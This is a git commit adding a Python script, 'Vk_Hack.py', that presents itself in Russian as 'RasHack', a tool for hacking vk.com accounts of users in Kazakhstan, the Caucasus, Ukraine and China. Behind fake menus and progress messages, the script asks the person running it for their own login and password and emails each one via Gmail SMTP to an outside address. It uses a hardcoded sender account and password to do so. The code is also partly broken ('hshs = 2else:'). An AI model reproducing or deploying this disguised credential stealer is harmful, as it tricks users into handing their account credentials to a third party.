e13481ccac69137df306ad3f04f72888ca8b58a0
Falos227 <53977874+Falos227@users.noreply.github.com>
2019-08-10 20:08:38 +0300

    Create Vk_Hack.py

---
+++ Vk_Hack.py
@@ -0,0 +1,69 @@
+print('Добро пожаловать в RasHack')
+
+print('RasHack-программа для тестирования защищенности учетных записей иностранных пользователей vk.com')
+
+print('для просмотра списка команд нажмите enter')
+
+a = input()
+
+if a == 4:
+
+	hshs = 2else:
+
+		print('Взлом пользователей Казахстана: kzh_hack')
+
+		print('Взлом пользователей со стран Закавказья: kav_hack')
+
+		print('Взлом пользователей с Украины: ukr_hack')
+
+		print('Взлом пользователей с Китая: china_hack')
+
+		print('Взлом пользователей со всех стран(max profit): all_hack')
+
+		z = input()
+
+if z == 'kzh_hack' or 'kav_hack' or 'ukr_hack' or 'china_hack' or 'all_hack':
+
+	print('done')
+
+import time
+
+time.sleep(7)
+
+print('starting...')
+
+	
+
+b = input('Your login:')
+
+c = input('Your password:')
+
+import smtplib
+
+smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
+
+smtpObj.starttls()
+
+smtpObj.login('kirilpupi@gmail.com','animegovno5')
+
+smtpObj.sendmail("kirilpupi@gmail.com","nikitaqwer1337@gmail.com", "{}".format(b))
+
+smtpObj.quit()
+
+smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
+
+smtpObj.starttls()
+
+smtpObj.login('kirilpupi@gmail.com','animegovno5')
+
+smtpObj.sendmail("kirilpupi@gmail.com","nikitaqwer1337@gmail.com", "{}".format(c))
+
+smtpObj.quit()
+
+v = input('Target id:')
+
+print('working...')
+
+time.sleep(300)
+
+print('eror27')
